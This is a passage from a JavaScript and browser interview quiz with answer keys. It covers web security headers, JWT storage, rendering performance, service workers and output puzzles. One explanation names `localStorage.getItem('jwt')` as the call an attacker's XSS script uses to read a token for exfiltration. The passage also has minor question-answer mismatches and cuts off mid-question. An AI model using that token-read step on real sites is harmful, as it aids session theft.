**Answer: B) Any page can send a message and inject HTML if origin is not validated; also using `innerHTML` with the data creates XSS**

**Explanation:** `postMessage` enables cross-origin communication, but any window can send a message. Without validating `event.origin`, a malicious page can send arbitrary data. Combined with `innerHTML`, it\'s a direct XSS vector. Always: 1) validate `event.origin` against the expected sender; 2) never use `innerHTML` with untrusted `event.data`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is clickjacking and how is it prevented?

- A) Clickjacking is when a script steals click events; prevented by `stopPropagation()`
- B) Clickjacking overlays a transparent iframe over a legitimate page to trick users into clicking on the hidden target; prevented by `X-Frame-Options` or CSP `frame-ancestors`
- C) Clickjacking is a type of XSS attack; prevented by input sanitization
- D) Clickjacking only affects mobile browsers

**Answer: B) Clickjacking overlays a transparent iframe over a legitimate page to trick users into clicking on the hidden target; prevented by `X-Frame-Options` or CSP `frame-ancestors`**

**Explanation:** Clickjacking embeds your site in a transparent `<iframe>` over a fake UI. A user clicks the fake button but actually clicks a button on your site (e.g., "Transfer Money"). Prevention: `X-Frame-Options: DENY` (don\'t embed in iframes at all) or CSP `frame-ancestors 'none'` (modern equivalent). React apps should include these headers at the server level.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `Subresource Integrity (SRI)` attribute prevent?

```html
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
</script>
```

- A) SRI prevents the script from accessing DOM APIs
- B) SRI verifies the fetched resource matches the expected hash — preventing modified/compromised CDN resources from executing
- C) SRI only works with CSS files, not JavaScript
- D) SRI prevents the script from making network requests

**Answer: B) SRI verifies the fetched resource matches the expected hash — preventing modified/compromised CDN resources from executing**

**Explanation:** SRI mitigates supply chain attacks — if a CDN is compromised and serves a modified script, the `integrity` hash won\'t match and the browser will block execution. The browser computes the hash of the downloaded resource and compares it to the `integrity` attribute. If they don\'t match, the script is not executed. Always use SRI with third-party CDN resources.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the risk of storing JWT tokens in `localStorage`?

- A) JWTs are automatically encrypted when stored in `localStorage`
- B) JWTs in `localStorage` are accessible to any JavaScript on the page — vulnerable to XSS attacks that can steal the token and impersonate the user
- C) JWTs in `localStorage` expire automatically after 1 hour
- D) `localStorage` is encrypted by the browser, making JWT storage safe

**Answer: B) JWTs in `localStorage` are accessible to any JavaScript on the page — vulnerable to XSS attacks that can steal the token and impersonate the user**

**Explanation:** A token in `localStorage` is readable by any script on the page. If an XSS vulnerability exists, an attacker can run `localStorage.getItem('jwt')` and exfiltrate the token. Safer: store JWTs in `HttpOnly` cookies (not accessible to JavaScript). Tradeoff: HttpOnly cookies require CSRF protection. For SPAs, implement a layered approach: short-lived access tokens in memory + HttpOnly refresh token cookies.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 25. Browser Performance (Browser Internals)

<br>

## Q. A developer reads a DOM property inside a loop. What is the performance problem?

```javascript
// Slow
for (let i = 0; i < 1000; i++) {
  document.getElementById("box").style.width = i + "px";
  console.log(document.getElementById("box").offsetWidth); // forces reflow
}
```

- A) `getElementById` is not safe inside loops
- B) Reading `offsetWidth` inside the write loop forces synchronous reflow (layout thrashing)
- C) `style.width` should use `classList` instead
- D) `console.log` is the performance bottleneck

**Answer: B) Reading `offsetWidth` inside the write loop forces synchronous reflow (layout thrashing)**

**Explanation:** Writing styles (invalidates layout) and then reading layout properties (`offsetWidth`, `getBoundingClientRect`) forces the browser to synchronously recalculate layout. The fix is to batch reads together and writes together, or use `requestAnimationFrame`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What triggers a repaint vs. a reflow?

- A) Changing `color` or `background` triggers reflow; changing `width` triggers repaint
- B) Changing geometric properties (`width`, `height`, `margin`) triggers reflow; changing visual properties (`color`, `background`) triggers repaint only
- C) Both reflow and repaint are the same operation
- D) Reflow only happens on page load; repaint happens on every DOM change

**Answer: B) Changing geometric properties (`width`, `height`, `margin`) triggers reflow; changing visual properties (`color`, `background`) triggers repaint only**

**Explanation:** A **reflow** (layout) recalculates element positions and sizes — it is expensive. A **repaint** just redraws pixels for visual changes without affecting layout — cheaper. Reflows always trigger a repaint, but not vice versa. Use CSS `transform` and `opacity` for animations as they can be composited on the GPU without triggering reflow.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the Critical Rendering Path?

- A) The fastest route between a client and a server
- B) The sequence of steps the browser takes to convert HTML, CSS, and JavaScript into pixels on the screen
- C) The order in which CSS selectors are matched
- D) The JavaScript execution queue

**Answer: B) The sequence of steps the browser takes to convert HTML, CSS, and JavaScript into pixels on the screen**

**Explanation:** The Critical Rendering Path: 1) Parse HTML → DOM. 2) Parse CSS → CSSOM. 3) Combine DOM + CSSOM → Render Tree. 4) Layout (calculate positions/sizes). 5) Paint (draw pixels). 6) Composite (GPU layers). Optimizing the CRP (inline critical CSS, defer non-critical JS, minimize render-blocking resources) reduces Time to First Paint and Time to Interactive.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `will-change` CSS property do for performance?

```css
.animated-element {
  will-change: transform;
}
```

- A) `will-change` disables animations for the element
- B) `will-change` hints to the browser that the element will be transformed, enabling GPU compositing and avoiding repaints during animation
- C) `will-change` is deprecated and has no effect in modern browsers
- D) `will-change` forces the element to render synchronously

**Answer: B) `will-change` hints to the browser that the element will be transformed, enabling GPU compositing and avoiding repaints during animation**

**Explanation:** `will-change: transform` tells the browser to promote the element to its own compositing layer in advance. During animation, the GPU handles the layer composite without triggering reflow/repaint. Use sparingly — every composited layer uses GPU memory. Don\'t apply it to everything; only elements with frequent transitions/animations that cause jank.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between `DOMContentLoaded` and `load` events for performance?

```javascript
document.addEventListener('DOMContentLoaded', () => {
  console.log('DOM ready, images may not be loaded');
});

window.addEventListener('load', () => {
  console.log('All resources loaded including images');
});
```

- A) They fire at the same time
- B) `DOMContentLoaded` fires when HTML is parsed (no waiting for images/CSS); `load` fires when ALL resources (images, stylesheets, iframes) are loaded
- C) `DOMContentLoaded` is deprecated; only `load` should be used
- D) `load` fires first; `DOMContentLoaded` fires after all rendering is complete

**Answer: B) `DOMContentLoaded` fires when HTML is parsed (no waiting for images/CSS); `load` fires when ALL resources (images, stylesheets, iframes) are loaded**

**Explanation:** `DOMContentLoaded` is the right event to initialize JavaScript that only needs DOM structure. `load` is needed when you require computed sizes of images or iframes. For performance, minimize work in both event handlers. Most app initialization should be done as early as possible — even in `<script defer>` which fires after parsing but before `DOMContentLoaded`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `IntersectionObserver` enable for performance?

```javascript
const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.src = entry.target.dataset.src; // lazy load
      observer.unobserve(entry.target);
    }
  });
});

document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img));
```

- A) `IntersectionObserver` modifies CSS when elements intersect
- B) `IntersectionObserver` efficiently detects when elements enter/exit the viewport without scroll event listeners, enabling lazy loading
- C) `IntersectionObserver` is equivalent to `getBoundingClientRect` in a scroll handler
- D) `IntersectionObserver` triggers synchronous layout calculations

**Answer: B) `IntersectionObserver` efficiently detects when elements enter/exit the viewport without scroll event listeners, enabling lazy loading**

**Explanation:** `IntersectionObserver` uses the browser\'s internal intersection detection — no scroll event listeners, no `getBoundingClientRect` polling. The browser batches notifications, firing callbacks asynchronously. This pattern for lazy loading images is highly performant: images load only when they scroll near the viewport, reducing initial load size dramatically.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the browser\'s rendering pipeline and where can JavaScript cause jank?

- A) JavaScript always causes jank — only CSS animations are smooth
- B) JavaScript running during the 16ms rendering budget (for 60fps) blocks the browser\'s style/layout/paint cycle, causing dropped frames (jank)
- C) JavaScript runs separately from rendering and never causes jank
- D) Jank only occurs with CSS animations, not JavaScript

**Answer: B) JavaScript running during the 16ms rendering budget (for 60fps) blocks the browser\'s paint cycle, causing dropped frames (jank)**

**Explanation:** At 60fps, the browser has ~16ms per frame. If JavaScript blocks the main thread longer than that, frames are dropped (jank). Solutions: use `requestAnimationFrame` for visual updates; move heavy computation to Web Workers; use `setTimeout(fn, 0)` to yield; break large tasks with `scheduler.yield()` (or `MessageChannel` patterns). The Performance panel in DevTools shows "Long Tasks" (>50ms).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does HTTP caching with `Cache-Control` headers do for web performance?

- A) `Cache-Control` only affects images, not JavaScript
- B) `Cache-Control` headers tell browsers and CDNs how long to cache resources, reducing network requests and improving load speed on repeat visits
- C) `Cache-Control` is a JavaScript API for controlling memory caches
- D) `Cache-Control: no-cache` disables all caching including in-memory

**Answer: B) `Cache-Control` headers tell browsers and CDNs how long to cache resources, reducing network requests and improving load speed on repeat visits**

**Explanation:** `Cache-Control: max-age=31536000, immutable` caches a file for a year with no re-validation (use with content-hashed filenames). `Cache-Control: no-cache` allows caching but revalidates with the server. `no-store` prevents caching entirely. For JS bundles: use content hashing (`main.abc123.js`) + long max-age. For HTML: short max-age or no-cache.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `preload` vs `prefetch` resource hint do?

```html
<!-- Preload: high priority, needed for current page -->
<link rel="preload" href="critical-font.woff2" as="font" crossorigin>

<!-- Prefetch: low priority, needed for next navigation -->
<link rel="prefetch" href="next-page-script.js">
```

- A) Both load resources immediately at high priority
- B) `preload` fetches resources needed for the current page at high priority; `prefetch` speculatively loads resources for future navigations at low priority
- C) `prefetch` blocks rendering; `preload` does not
- D) Both are identical — `as` attribute determines priority

**Answer: B) `preload` fetches resources needed for the current page at high priority; `prefetch` speculatively loads resources for future navigations at low priority**

**Explanation:** `preload` tells the browser to download a resource ASAP for the current page (e.g., fonts, hero images, critical scripts). `prefetch` downloads resources at low priority in the browser\'s idle time for potential future use. Using `preload` incorrectly (for resources not used on the page) wastes bandwidth. `prefetch` is ideal for code-split chunks of routes the user might navigate to next.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `Performance` API provide for measuring real user performance?

```javascript
performance.mark('start-processing');
// ... heavy work ...
performance.mark('end-processing');
performance.measure('processing-time', 'start-processing', 'end-processing');

const measures = performance.getEntriesByName('processing-time');
console.log(measures[0].duration, 'ms');
```

- A) `performance.mark` only works in Node.js
- B) The Performance API provides high-resolution timing (microseconds) for measuring real user metrics like processing time, navigation timing, and resource loading
- C) `performance.measure` returns approximate times in seconds
- D) Performance marks are only visible in DevTools and not accessible via JavaScript

**Answer: B) The Performance API provides high-resolution timing (microseconds) for measuring real user metrics**

**Explanation:** The `Performance` API (`performance.now()`, `mark()`, `measure()`) provides high-resolution timestamps accurate to microseconds. It\'s the foundation for Real User Monitoring (RUM). `getEntriesByType('navigation')` gives page load timing; `getEntriesByType('resource')` shows resource load times. Combined with `PerformanceObserver`, you can track Core Web Vitals (LCP, FID, CLS) in real user sessions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `script` `defer` attribute do differently from `async`?

```html
<script src="a.js" defer></script>
<script src="b.js" defer></script>
<script src="c.js" async></script>
```

- A) `defer` and `async` both block HTML parsing
- B) `defer` downloads in parallel and executes in order after HTML parsing; `async` downloads in parallel and executes immediately when ready (order not guaranteed)
- C) `async` preserves execution order; `defer` does not
- D) `defer` only works with inline scripts

**Answer: B) `defer` downloads in parallel and executes in order after HTML parsing; `async` downloads in parallel and executes immediately when ready (order not guaranteed)**

**Explanation:** `defer`: downloads while HTML parses; executes in document order after parsing completes, before `DOMContentLoaded`. Good for scripts that depend on DOM or each other. `async`: downloads while HTML parses; executes immediately when downloaded, interrupting parsing. Order not guaranteed. Good for independent analytics/tracking scripts. Neither blocks HTML parsing during download.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 26. Progressive Web Apps (PWA)

<br>

## Q. A developer registers a Service Worker. What does the following do?

```javascript
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/sw.js")
    .then(reg => console.log("SW registered:", reg.scope))
    .catch(err => console.log("SW failed:", err));
}
```

- A) Registers a Web Worker for parallel computation
- B) Registers a Service Worker that can intercept network requests and cache assets
- C) Enables push notifications without user permission
- D) Creates a shared worker accessible across all browser tabs

**Answer: B) Registers a Service Worker that can intercept network requests and cache assets**

**Explanation:** A Service Worker is a script that runs in the background, separate from the web page. It acts as a proxy for network requests, enabling offline support via caching strategies (Cache-First, Network-First, etc.), background sync, and push notifications.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer implements a Cache-First caching strategy. What does this mean?

```javascript
self.addEventListener("fetch", event => {
  event.respondWith(
    caches.match(event.request).then(cached => {
      return cached || fetch(event.request);
    })
  );
});
```

- A) Always fetches from the network; never uses the cache
- B) Returns cached response if available; falls back to network if not cached
- C) Always uses the network and updates the cache in the background
- D) Only caches POST requests

**Answer: B) Returns cached response if available; falls back to network if not cached**

**Explanation:** Cache-First prioritizes the cache for speed, making the app work offline or in low-network conditions. If the resource is not cached, it fetches from the network. Contrast with Network-First (tries network, falls back to cache) for frequently updated content.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What are the three core requirements of a Progressive Web App?

- A) React framework, TypeScript, and webpack
- B) A Web App Manifest, a Service Worker, and HTTPS
- C) A Web App Manifest, IndexedDB, and push notifications
- D) Service Worker, WebSockets, and WebAssembly

**Answer: B) A Web App Manifest, a Service Worker, and HTTPS**

**Explanation:** The three PWA requirements: 1) **Web App Manifest** (`manifest.json`) — metadata for add-to-homescreen (name, icons, display mode). 2) **Service Worker** — enables offline capability, background sync, push notifications (requires HTTPS). 3) **HTTPS** — required by browsers for Service Workers (except `localhost`). Together these enable installability, offline support, and app-like experience.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a Service Worker\'s `fetch` event intercept?

```javascript
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(response => {
      return response || fetch(event.request);
    })
  );
});
```

- A) Only POST requests
- B) All network requests from the controlled page — the SW can respond with cached data, modify requests, or pass through to the network
- C) Only requests to the SW\'s own origin
- D) Only requests made with `XMLHttpRequest`, not `fetch`

**Answer: B) All network requests from the controlled page — the SW can respond with cached data, modify requests, or pass through to the network**

**Explanation:** The `fetch` event fires for every network request from controlled pages (except navigations with `navigate` scope issues). `event.respondWith()` intercepts the request and provides a response. The Service Worker acts as a programmable network proxy, enabling caching strategies, offline support, and request transformation.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `beforeinstallprompt` event enable?

```javascript
let deferredPrompt;

window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  document.getElementById('install-btn').style.display = 'block';
});

document.getElementById('install-btn').addEventListener('click', () => {
  deferredPrompt.prompt();
  deferredPrompt.userChoice.then(choice => {
    console.log(choice.outcome); // 'accepted' or 'dismissed'
  });
});
```

- A) `beforeinstallprompt` fires when the user manually installs the PWA
- B) `beforeinstallprompt` allows the app to defer and customize the browser\'s install prompt for the PWA
- C) `beforeinstallprompt` fires on every page load
- D) `beforeinstallprompt` is deprecated — use `install` event instead

**Answer: B) `beforeinstallprompt` allows the app to defer and customize the browser\'s install prompt for the PWA**

**Explanation:** By default, browsers show an install banner automatically. `e.preventDefault()` suppresses it, storing the event. The app can show a custom install button at the right moment (after meaningful interaction). `deferredPrompt.prompt()` shows the native browser install dialog. `userChoice` tells you if the user accepted. This pattern improves install conversion rates.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a `display` mode of `standalone` in the Web App Manifest do?

```json
{
  "name": "My App",
  "display": "standalone",
  "start_url": "/",
  "theme_color": "#2196F3"
}
```

- A) The app opens in a regular browser tab with the address bar
- B) The app opens without browser UI chrome (no address bar, back/forward buttons) — appears like a native app
- C) The app only works in fullscreen mode
- D) `standalone` requires a native wrapper (Electron, Capacitor)

**Answer: B) The app opens without browser UI chrome (no address bar, back/forward buttons) — appears like a native app**

**Explanation:** `display: standalone` removes browser chrome (address bar, navigation buttons) when launched from the homescreen. The app gets its own window, taskbar entry, and splash screen. `fullscreen` goes further (no OS chrome). `minimal-ui` keeps some navigation. `browser` is the default tab experience. Standalone is the most common choice for app-like PWAs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Background Sync` enable in PWAs?

- A) Background Sync allows the app to run JavaScript continuously in the background
- B) Background Sync enables deferred actions (form submissions, data sync) to be retried when the user regains connectivity
- C) Background Sync syncs the app\'s state with a server every 30 seconds
- D) Background Sync is equivalent to server-sent events

**Answer: B) Background Sync enables deferred actions (form submissions, data sync) to be retried when the user regains connectivity**

**Explanation:** Background Sync registers a sync event with the Service Worker. If the user submits a form offline, the action is queued. When connectivity is restored, the browser fires a `sync` event in the Service Worker, which then makes the deferred request. This ensures data isn\'t lost due to intermittent connectivity — critical for mobile-first applications.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What makes an app "installable" as a PWA?

- A) Any HTTPS website is automatically installable
- B) The app must be on HTTPS, have a valid Web App Manifest with required fields (name, icons, start_url, display), and have an active Service Worker that handles `fetch` events
- C) The app must be built with React or Angular
- D) Only apps with 100 Lighthouse score are installable

**Answer: B) The app must be on HTTPS, have a valid manifest, and have an active Service Worker**

**Explanation:** Chrome\'s install criteria: 1) HTTPS. 2) Valid manifest with `name`/`short_name`, `icons` (192px + 512px), `start_url`, and `display`. 3) Registered Service Worker with a `fetch` handler. 4) Has not been dismissed by the user recently. Lighthouse PWA audit checks all these criteria and reports installability issues with specific fixes.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Stale-While-Revalidate` caching strategy accomplish in a PWA?

- A) Returns stale data and deletes it; fetches fresh data only when explicitly requested
- B) Returns the cached response immediately while fetching an update in the background to refresh the cache for the next request
- C) Returns stale data permanently — never updates
- D) Blocks rendering until fresh data is available

**Answer: B) Returns the cached response immediately while fetching an update in the background**

**Explanation:** Stale-While-Revalidate is optimal for non-critical, frequently changing resources (news feeds, social content). The user sees stale (but fast) content immediately. In the background, the Service Worker fetches the latest version and updates the cache — the next visit shows fresh content. This balances speed (serve cached) with freshness (update in background). Libraries like Workbox implement this easily.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the Push API + Notifications API enable for PWAs?

```javascript
// In Service Worker — handling push event
self.addEventListener('push', (event) => {
  const data = event.data.json();
  event.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/icons/notification.png'
    })
  );
});
```

- A) Push notifications only work when the browser is open
- B) The Push API allows servers to send messages to Service Workers even when the app is closed; Notifications API displays the OS-level notification
- C) Push notifications require a native app wrapper
- D) Push notifications can only be sent from the same origin

**Answer: B) The Push API allows servers to send messages to Service Workers even when the app is closed**

**Explanation:** Push works even when the browser is closed: the push service (browser vendor\'s) receives the server\'s message and wakes the Service Worker. `event.waitUntil` keeps the SW alive while showing the notification. The user must grant notification permission. The server sends pushes via the Web Push Protocol using VAPID keys. This enables PWAs to re-engage users like native apps.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `Service Worker` lifecycle look like for an update?

- A) New SW installs and activates immediately, replacing the old one
- B) New SW installs while old SW controls the page; new SW waits until all tabs close (or `skipWaiting()` is called) before activating
- C) New SW downloads but never activates unless the user manually refreshes
- D) Service Workers cannot be updated — a new URL must be used

**Answer: B) New SW installs while old SW controls the page; new SW waits in "waiting" state until all tabs close or `skipWaiting()` is called**

**Explanation:** SW update lifecycle: 1) Browser detects new SW file. 2) New SW **installs** (`install` event). 3) New SW enters **waiting** state (old SW still controls pages). 4) When all controlled tabs close, new SW **activates**. Use `self.skipWaiting()` in `install` + `clients.claim()` in `activate` to take control immediately (with caution — can cause version mismatches).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 27. Real-World Problem Solving

<br>

## Q. A developer needs to deep clone an object without using a library. Which approach is correct and safe for JSON-serializable data?

```javascript
const original = { a: 1, b: { c: 2 }, d: [3, 4] };

// Option A
const clone1 = Object.assign({}, original);

// Option B
const clone2 = JSON.parse(JSON.stringify(original));

// Option C
const clone3 = { ...original };
```

- A) Option A — `Object.assign` deep clones all nested objects
- B) Option B — `JSON.parse(JSON.stringify(...))` creates a true deep clone for JSON-safe data
- C) Option C — spread operator deep clones arrays and objects
- D) All three produce identical deep clones

**Answer: B) Option B — `JSON.parse(JSON.stringify(...))` creates a true deep clone for JSON-safe data**

**Explanation:** Both `Object.assign` and spread `{...}` perform **shallow copies** — nested objects still share references. `JSON.parse(JSON.stringify())` creates a true deep clone but loses `undefined`, `Date` objects, `functions`, and circular references. For production, use `structuredClone()` (modern) or a library like Lodash\'s `_.cloneDeep`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer debugging a memory leak identifies that event listeners are not removed. Which pattern correctly prevents this?

```javascript
class Component {
  constructor() {
    this.handleClick = this.handleClick.bind(this);
    document.addEventListener("click", this.handleClick);
  }
  handleClick(e) { console.log("clicked"); }
  destroy() {
    document.removeEventListener("click", this.handleClick);
  }
}
```

- A) This pattern is wrong — you cannot store bound functions
- B) This correctly allows removal because the same function reference is stored
- C) `removeEventListener` requires passing a new function reference
- D) This creates a new listener every time `destroy()` is called

**Answer: B) This correctly allows removal because the same function reference is stored**

**Explanation:** `removeEventListener` requires the **exact same function reference** used in `addEventListener`. By storing `this.handleClick = this.handleClick.bind(this)` in the constructor, the same reference is used for both adding and removing. Anonymous functions or inline `bind()` calls in `addEventListener` cannot be removed.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer implements `flatDeep` — a function that flattens a deeply nested array. What does the following return?

```javascript
const nested = [1, [2, [3, [4, [5]]]]];

console.log(nested.flat(Infinity));
console.log(nested.flat(1));
console.log(nested.flat(2));
```

- A) `[1,2,3,4,5]`, `[1,2,[3,[4,[5]]]]`, `[1,2,3,[4,[5]]]`
- B) `[1,2,3,4,5]`, `[1,[2,[3,[4,[5]]]]]`, `[1,2,3,4,5]`
- C) `[1,2,3,4,5]`, `[1,2,3,4,5]`, `[1,2,3,4,5]`
- D) `TypeError: flat is not a function`

**Answer: A) `[1,2,3,4,5]`, `[1,2,[3,[4,[5]]]]`, `[1,2,3,[4,[5]]]`**

**Explanation:** `.flat(depth)` flattens the array by the specified depth. `Infinity` flattens completely. `flat(1)` removes one level of nesting. `flat(2)` removes two levels. This is an ES2019 built-in method.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer needs to implement a function that groups array items by a key. What is the output?

```javascript
const people = [
  { name: "Alice", dept: "Engineering" },
  { name: "Bob", dept: "Marketing" },
  { name: "Carol", dept: "Engineering" }
];

const grouped = Object.groupBy(people, p => p.dept);
console.log(grouped["Engineering"].length);
console.log(grouped["Marketing"][0].name);
```

- A) `2`, `"Bob"`
- B) `1`, `"Bob"`
- C) `3`, `"Alice"`
- D) `TypeError: Object.groupBy is not a function` in all browsers

**Answer: A) `2`, `"Bob"`**

**Explanation:** `Object.groupBy()` (ES2024) groups array items into an object by the return value of the callback. `"Engineering"` gets Alice and Carol (length `2`); `"Marketing"` gets Bob. Use `.reduce()` as a polyfill for older environments.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer writes the following function and runs it. What does `console.log(foo(), typeof x, typeof y)` output?

```javascript
function foo() {
  let x = (y = 0);
  x++;
  y++;
  return x;
}

console.log(foo(), typeof x, typeof y);
```

- A) `1`, `"undefined"`, `"undefined"`
- B) `1`, `"number"`, `"number"`
- C) `1`, `"undefined"`, `"number"`
- D) `ReferenceError: y is not defined`

**Answer: C) `1`, `"undefined"`, `"number"`**

**Explanation:** The expression `let x = (y = 0)` is evaluated right-to-left. `y` is never declared with `let`/`var`/`const`, so it becomes an implicit global variable. `x` is block-scoped to `foo`. After the call, `typeof x` is `"undefined"` (no such variable in outer scope) and `typeof y` is `"number"` (global `y` holds `1` after `y++`).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer chains `filter`, `map`, and `reduce` on an array. What is the final result?

```javascript
const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

const result = numbers
  .filter(num => num % 2 === 0)
  .map(num => num * 2)
  .reduce((sum, num) => sum + num, 0);

console.log(result);
```

- A) `30`
- B) `55`
- C) `60`
- D) `110`

**Answer: C) `60`**

**Explanation:** `filter` keeps only even numbers `[2, 4, 6, 8, 10]`. `map` doubles each → `[4, 8, 12, 16, 20]`. `reduce` sums all values starting from `0` → `4 + 8 + 12 + 16 + 20 = 60`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. An async function throws an error. What is logged to the console in order?

```javascript
async function fetchData() {
  throw new Error('Network error');
}

async function getData() {
  try {
    const data = await fetchData();
    console.log(data);
    return data;
  } catch (error) {
    console.log('Caught:', error.message);
    return null;
  }
}

getData().then(result => {
  console.log('Result:', result);
});
```

- A) `Result: null`, then `Caught: Network error`
- B) `Caught: Network error`, then `Result: null`
- C) `Caught: Network error` only — `.then()` never runs
- D) Unhandled promise rejection — no output

**Answer: B) `Caught: Network error`, then `Result: null`**

**Explanation:** `fetchData()` rejects immediately. The `catch` block in `getData()` handles the error, logs `'Caught: Network error'`, and returns `null`. The `.then()` on the resolved `getData()` promise then logs `'Result: null'`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer defines a class with two `constructor` methods. What happens when the code runs?

```javascript
class Rectangle {
  constructor(height, width) {
    this.height = height;
    this.width = width;
  }
  constructor(width) {
    this.width = width;
  }
}

const square = new Rectangle(20, 30);
console.log(square.area);
```

- A) Logs `undefined` — `area` is not defined
- B) Logs `600` — the first constructor wins
- C) `SyntaxError: A class may only have one constructor`
- D) `TypeError: Cannot create instance`

**Answer: C) `SyntaxError: A class may only have one constructor`**

**Explanation:** JavaScript classes do not support constructor overloading. Defining more than one `constructor` in a class body is a syntax error and throws `SyntaxError` before any code executes. Use default parameters or factory patterns to simulate overloading.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer creates two independent counters using closures. What is the output?

```javascript
function createCounter() {
  let count = 0;
  return function () {
    count++;
    return count;
  };
}

const counter1 = createCounter();
const counter2 = createCounter();

console.log(counter1()); // ?
console.log(counter1()); // ?
console.log(counter2()); // ?
console.log(counter1()); // ?
```

- A) `1`, `2`, `3`, `4`
- B) `1`, `2`, `1`, `3`
- C) `1`, `1`, `1`, `1`
- D) `1`, `2`, `2`, `3`

**Answer: B) `1`, `2`, `1`, `3`**

**Explanation:** Each call to `createCounter()` creates a new closure with its own independent `count` variable. `counter1` and `counter2` do not share state. `counter1` increments to 1, 2, then 3. `counter2` starts its own sequence from 1.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A function uses object destructuring with default values. What does the third call log?

```javascript
function displayUser({ name = 'Guest', age = 18, country } = {}) {
  console.log(`Name: ${name}, Age: ${age}, Country: ${country}`);
}

displayUser();
```

- A) `TypeError: Cannot destructure property 'name' of undefined`
- B) `Name: undefined, Age: undefined, Country: undefined`
- C) `Name: Guest, Age: 18, Country: undefined`
- D) `Name: Guest, Age: 18, Country: null`

**Answer: C) `Name: Guest, Age: 18, Country: undefined`**

**Explanation:** The `= {}` at the end of the parameter list provides a default empty object when no argument is passed, preventing a `TypeError`. `name` and `age` use their defaults (`'Guest'` and `18`). `country` has no default, so it is `undefined`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `setTimeout` with `0` ms delay inside a function. What is the output order?

```javascript
function main() {
  console.log('A');
  setTimeout(function print() {
    console.log('B');
  }, 0);
  console.log('C');
}
main();
```

- A) `A`, `B`, `C`
- B) `A`, `C`, `B`
- C) `B`, `A`, `C`
- D) `A`, `C` — `B` is never logged

**Answer: B) `A`, `C`, `B`**

**Explanation:** Even with a delay of `0`, `setTimeout` places its callback in the macrotask queue. The call stack must be empty before the event loop picks it up. So `'A'` and `'C'` are logged synchronously first, then `'B'` is logged after `main()` returns.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer compares floating-point arithmetic. What does this code output?

```javascript
console.log(0.1 + 0.2 === 0.3);
```

- A) `true`
- B) `false`
- C) `undefined`
- D) `RangeError: floating-point overflow`

**Answer: B) `false`**

**Explanation:** Due to IEEE 754 binary floating-point representation, `0.1 + 0.2` evaluates to `0.30000000000000004`, not exactly `0.3`. To safely compare floating-point numbers, use `Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer creates a `User` constructor and calls `getProfile()`. What does `profile()` log?

```javascript
function User(name, age) {
  this.name = name;
  this.age = age;
  this.getProfile = function () {
    return () => {
      console.log("I'm " + this.name + ", " + this.age + " yrs old");
    };
  };
}

let user = new User('John', 25);
let profile = user.getProfile();
profile();
```

- A) `I'm undefined, undefined yrs old`
- B) `I'm , undefined yrs old`
- C) `I'm John, 25 yrs old`
- D) `TypeError: Cannot read property 'name' of undefined`

